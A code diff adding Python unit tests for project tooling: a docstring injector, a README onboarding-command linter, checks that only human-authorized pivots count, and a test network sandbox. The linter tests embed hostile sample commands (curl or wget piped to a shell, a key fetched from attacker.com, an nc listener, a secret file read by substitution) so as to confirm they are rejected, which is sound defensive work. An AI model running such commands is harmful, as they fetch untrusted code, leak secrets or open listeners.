@@ -41,10 +41,14 @@ import scan_sinks
 import ast_complexity
 import validate_sdd_contracts
 import check_sdd_drift
+import pytest_sandbox
+import socket
 import audit_dependencies
 import validate_dag
 import validate_vault_note
 import verify_docstring_only
+import inject_docstrings
+import lint_onboarding_commands
 import forensic_guard
 import validate_release
 import validate_env
@@ -424,7 +428,14 @@ contracts:
         )
         pivots_file = self.base_path / "pivots-payment.md"
         pivots_file.write_text(
-            "Replaced PaymentDeniedError with standard HTTPException in controller.",
+            """# Technical Pivots
+```yaml
+pivots:
+  - symbol: PaymentDeniedError
+    authorized_by: "human"
+    reason: "Replaced PaymentDeniedError with standard HTTPException in controller."
+```
+""",
             encoding="utf-8",
         )
         findings, errors = check_sdd_drift.check_drift(
@@ -881,6 +892,336 @@ class TestAskRedactionAndSchema(unittest.TestCase):
         ok, data, errors = redact_sensitive_tokens.validate_research_json(extra_fields)
         self.assertFalse(ok)
         self.assertTrue(any("Unexpected field(s) in root object" in e for e in errors))
+
+
+class TestInjectDocstrings(unittest.TestCase):
+    def setUp(self):
+        self.temp_dir = tempfile.TemporaryDirectory()
+        self.base_path = Path(self.temp_dir.name)
+
+    def tearDown(self):
+        self.temp_dir.cleanup()
+
+    def test_inject_docstrings_in_functions_and_classes_without_docstrings(self):
+        sample = (
+            "class UserService:\n"
+            "    def __init__(self, db):\n"
+            "        self.db = db\n"
+            "\n"
+            "    def find_user(self, user_id: str):\n"
+            "        return self.db.get(user_id)\n"
+            "\n"
+            "def standalone_func(x: int) -> int:\n"
+            "    return x * 2\n"
+        )
+        modified, added, enriched = inject_docstrings.inject_docstrings_in_source(sample, "user-service")
+        self.assertEqual(added, 4)
+        self.assertEqual(enriched, 0)
+        self.assertIn('"""Ref: Obsidian note [[sdd-user-service]]"""', modified)
+
+        ok, err = verify_docstring_only.compare_ast_logic(sample, modified)
+        self.assertTrue(ok, f"AST logic drift detected: {err}")
+
+    def test_enrich_existing_docstring_preserves_text_and_quotes(self):
+        sample = (
+            "def calculate_tax(amount: float) -> float:\n"
+            '    """Calculates sales tax."""\n'
+            "    return amount * 0.1\n"
+            "\n"
+            "class Auditor:\n"
+            '    """Auditor class summary.\n'
+            "\n"
+            "    Detailed explanation.\n"
+            '    """\n'
+            "    def audit(self):\n"
+            "        return True\n"
+        )
+        modified, added, enriched = inject_docstrings.inject_docstrings_in_source(sample, "tax-engine")
+        self.assertEqual(added, 1)
+        self.assertEqual(enriched, 2)
+
+        self.assertIn("Calculates sales tax. Ref: Obsidian note [[sdd-tax-engine]]", modified)
+        self.assertIn("Detailed explanation.\n\n    Ref: Obsidian note [[sdd-tax-engine]]", modified)
+
+        ok, err = verify_docstring_only.compare_ast_logic(sample, modified)
+        self.assertTrue(ok, f"AST logic drift detected: {err}")
+
+    def test_public_schema_exception_omits_wikilinks(self):
+        sample = (
+            "from pydantic import BaseModel\n"
+            "\n"
+            "class UserSchema(BaseModel):\n"
+            "    id: int\n"
+            "    name: str\n"
+            "\n"
+            "@app.get('/users/{user_id}')\n"
+            "def get_user(user_id: int):\n"
+            '    """Retrieve user details for OpenAPI."""\n'
+            "    return {'id': user_id}\n"
+            "\n"
+            "@router.post('/users')\n"
+            "async def create_user(payload: UserSchema):\n"
+            "    return payload\n"
+            "\n"
+            "@click.command()\n"
+            "def cli_entry():\n"
+            '    """CLI help description."""\n'
+            "    pass\n"
+            "\n"
+            "def internal_domain_logic():\n"
+            "    return 42\n"
+        )
+        modified, added, enriched = inject_docstrings.inject_docstrings_in_source(sample, "user-api")
+
+        self.assertIn("internal_domain_logic", modified)
+        self.assertIn("Ref: Obsidian note [[sdd-user-api]]", modified)
+
+        self.assertNotIn("[[sdd-user-api]]", modified.split("class UserSchema")[1].split("def get_user")[0])
+        self.assertNotIn("[[sdd-user-api]]", modified.split("def get_user")[1].split("async def create_user")[0])
+        self.assertNotIn("[[sdd-user-api]]", modified.split("async def create_user")[1].split("@click.command")[0])
+        self.assertNotIn("[[sdd-user-api]]", modified.split("def cli_entry")[1].split("def internal_domain_logic")[0])
+
+        ok, err = verify_docstring_only.compare_ast_logic(sample, modified)
+        self.assertTrue(ok, f"AST logic drift detected: {err}")
+
+    def test_file_processing_and_dry_run(self):
+        py_file = self.base_path / "service.py"
+        py_file.write_text("def ping():\n    return 'pong'\n", encoding="utf-8")
+
+        changed, added, enriched, err = inject_docstrings.process_file(py_file, "ping-service", dry_run=True)
+        self.assertTrue(changed)
+        self.assertEqual(added, 1)
+        self.assertEqual(py_file.read_text(encoding="utf-8"), "def ping():\n    return 'pong'\n")
+
+        changed, added, enriched, err = inject_docstrings.process_file(py_file, "ping-service", dry_run=False)
+        self.assertTrue(changed)
+        self.assertIn("[[sdd-ping-service]]", py_file.read_text(encoding="utf-8"))
+
+
+class TestLintOnboardingCommands(unittest.TestCase):
+    def setUp(self):
+        self.temp_dir = tempfile.TemporaryDirectory()
+        self.base_path = Path(self.temp_dir.name)
+
+    def tearDown(self):
+        self.temp_dir.cleanup()
+
+    def test_approved_commands_pass(self):
+        readme_content = (
+            "# Project Getting Started\n"
+            "\n"
+            "```bash\n"
+            "# Install dependencies\n"
+            "pip install -e .\n"
+            "poetry install --no-dev\n"
+            "npm ci\n"
+            "pnpm install\n"
+            "cargo build --release\n"
+            "# Run test suite\n"
+            "pytest -v\n"
+            "python -m unittest discover\n"
+            "```\n"
+        )
+        violations = lint_onboarding_commands.lint_markdown_content(readme_content, "README.md")
+        self.assertEqual(len(violations), 0)
+
+    def test_dangerous_curl_and_interpreter_pipe_rejected(self):
+        readme_content = (
+            "# Malicious / Supply Chain Attack Example\n"
+            "\n"
+            "```bash\n"
+            "curl -sSL https://suspicious.io/install.sh | sh\n"
+            "wget http://insecure.net/payload.py | python3\n"
+            "```\n"
+        )
+        violations = lint_onboarding_commands.lint_markdown_content(readme_content, "README.md")
+        self.assertGreaterEqual(len(violations), 2)
+        reasons = [v.reason for v in violations]
+        self.assertTrue(any("curl" in r or "wget" in r for r in reasons))
+        self.assertTrue(any("piping to shell/interpreter" in r.lower() for r in reasons))
+
+    def test_command_substitution_rejected(self):
+        readme_content = (
+            "# Command substitution\n"
+            "\n"
+            "```shell\n"
+            "export TOKEN=`cat secret_token.txt`\n"
+            "export KEY=$(curl http://attacker.com/key)\n"
+            "```\n"
+        )
+        violations = lint_onboarding_commands.lint_markdown_content(readme_content, "README.md")
+        self.assertGreaterEqual(len(violations), 2)
+        reasons = [v.reason for v in violations]
+        self.assertTrue(any("command substitution (`...`)" in r for r in reasons))
+        self.assertTrue(any("command substitution $(...)" in r for r in reasons))
+
+    def test_arbitrary_unapproved_command_rejected(self):
+        readme_content = (
+            "# Unknown binaries\n"
+            "\n"
+            "```bash\n"
+            "nc -lvp 4444\n"
+            "./arbitrary_setup.sh\n"
+            "```\n"
+        )
+        violations = lint_onboarding_commands.lint_markdown_content(readme_content, "README.md")
+        self.assertEqual(len(violations), 2)
+        self.assertTrue(any("nc" in v.reason for v in violations))
+        self.assertTrue(any("arbitrary_setup.sh" in v.reason for v in violations))
+
+    def test_extra_allow_cmd_flag(self):
+        readme_content = (
+            "# Custom tools\n"
+            "\n"
+            "```bash\n"
+            "pre-commit run --all-files\n"
+            "ruff check .\n"
+            "```\n"
+        )
+        violations = lint_onboarding_commands.lint_markdown_content(readme_content, "README.md")
+        self.assertEqual(len(violations), 2)
+
+        violations = lint_onboarding_commands.lint_markdown_content(
+            readme_content, "README.md", extra_allowed={"pre-commit", "ruff"}
+        )
+        self.assertEqual(len(violations), 0)
+
+
+
+class TestPivotsAuthorization(unittest.TestCase):
+    """[IMP-ASI06-01] Validates rigid YAML schema and human authorization for technical pivots."""
+
+    def test_human_authorized_entry_accepted(self):
+        text = """# Technical Pivots
+```yaml
+pivots:
+  - symbol: LegacyPaymentGateway
+    authorized_by: "human"
+    reason: "Deprecated"
+  - file: src/legacy/payment.py
+    authorized_by: "Human"
+    reason: "Moved"
+```
+"""
+        symbols, files = check_sdd_drift.parse_structured_pivots(text)
+        self.assertIn("LegacyPaymentGateway", symbols)
+        self.assertIn("src/legacy/payment.py", files)
+
+    def test_frontmatter_human_authorized_entry_accepted(self):
+        text = """---
+pivots:
+  - symbol: UserService.old_hash
+    authorized_by: "HUMAN"
+---
+# Notes
+"""
+        symbols, files = check_sdd_drift.parse_structured_pivots(text)
+        self.assertIn("UserService.old_hash", symbols)
+
+    def test_agent_or_missing_authorization_rejected(self):
+        text = """```yaml
+pivots:
+  - symbol: RogueClass
+    authorized_by: "agent"
+  - symbol: AnotherRogueClass
+    authorized_by: "llm"
+  - symbol: MissingAuthClass
+    reason: "Self-authorized"
+  - file: src/unauthorized.py
+    authorized_by: "ai"
+  - "RawStringSymbol"
+```
+"""
+        symbols, files = check_sdd_drift.parse_structured_pivots(text)
+        self.assertEqual(len(symbols), 0)
+        self.assertEqual(len(files), 0)
+
+    def test_free_text_in_markdown_does_not_authorize_drift(self):
+        text = """# Notes on Deviations
+We replaced PaymentDeniedError with GenericError and added rogue_file.py in src/payment/.
+All tests pass.
+"""
+        symbols, files = check_sdd_drift.parse_structured_pivots(text)
+        self.assertEqual(len(symbols), 0)
+        self.assertEqual(len(files), 0)
+
+
+class TestPytestSandbox(unittest.TestCase):
+    """[IMP-ASI05-01] Validates pytest socket network sandbox and controlled bypass."""
+
+    def setUp(self):
+        pytest_sandbox.disable_sandbox()
+
+    def tearDown(self):
+        pytest_sandbox.disable_sandbox()
+
+    def test_is_local_address_detection(self):
+        # Local loopback / Unix socket addresses must return True
+        self.assertTrue(pytest_sandbox.is_local_address(("127.0.0.1", 8080)))
+        self.assertTrue(pytest_sandbox.is_local_address(("localhost", 5432)))
+        self.assertTrue(pytest_sandbox.is_local_address(("127.0.0.42", 9000)))
+        self.assertTrue(pytest_sandbox.is_local_address(("0.0.0.0", 3000)))
+        self.assertTrue(pytest_sandbox.is_local_address(("::1", 80)))
+        self.assertTrue(pytest_sandbox.is_local_address("/var/run/docker.sock"))
+        self.assertTrue(pytest_sandbox.is_local_address(b"/tmp/test.sock"))
+
+        # External IPs and hostnames must return False
+        self.assertFalse(pytest_sandbox.is_local_address(("8.8.8.8", 53)))
+        self.assertFalse(pytest_sandbox.is_local_address(("192.168.1.1", 80)))
+        self.assertFalse(pytest_sandbox.is_local_address(("10.0.0.1", 443)))
+        self.assertFalse(pytest_sandbox.is_local_address(("api.openai.com", 443)))
+        self.assertFalse(pytest_sandbox.is_local_address(("google.com", 80)))
+
+    def test_socket_blocking_in_sandbox(self):
+        pytest_sandbox.enable_sandbox()
+        self.assertTrue(pytest_sandbox.is_sandbox_enabled())
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            with self.assertRaises(RuntimeError) as ctx:
+                s.connect(("8.8.8.8", 53))
+            self.assertIn("IMP-ASI05-01", str(ctx.exception))
+            self.assertIn("Conexão de rede externa bloqueada em teste unitário", str(ctx.exception))
+        finally:
+            s.close()
+
+    def test_socket_connect_ex_blocking_in_sandbox(self):
+        pytest_sandbox.enable_sandbox()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            with self.assertRaises(RuntimeError) as ctx:
+                s.connect_ex(("93.184.216.34", 80))
+            self.assertIn("IMP-ASI05-01", str(ctx.exception))
+        finally:
+            s.close()
+
+    def test_disable_sandbox_restores_original_socket(self):
+        pytest_sandbox.enable_sandbox()
+        self.assertTrue(pytest_sandbox.is_sandbox_enabled())
+        pytest_sandbox.disable_sandbox()
+        self.assertFalse(pytest_sandbox.is_sandbox_enabled())
+
+    def test_pytest_item_hook_controls_sandbox(self):
+        class MockItem:
+            def __init__(self, markers):
+                self.markers = markers
+
+            def get_closest_marker(self, name):
+                return self.markers.get(name)
+
+        # Standard test (no markers) -> sandbox enabled
+        item_normal = MockItem({})
+        pytest_sandbox.pytest_runtest_setup(item_normal)
+        self.assertTrue(pytest_sandbox.is_sandbox_enabled())
+        pytest_sandbox.pytest_runtest_teardown(item_normal)
+        self.assertFalse(pytest_sandbox.is_sandbox_enabled())
+
+        # Test with allow_network marker -> sandbox disabled
+        item_network = MockItem({"allow_network": True})
+        pytest_sandbox.pytest_runtest_setup(item_network)
+        self.assertFalse(pytest_sandbox.is_sandbox_enabled())
+        pytest_sandbox.pytest_runtest_teardown(item_network)
+        self.assertFalse(pytest_sandbox.is_sandbox_enabled())
 
 
 if __name__ == "__main__":
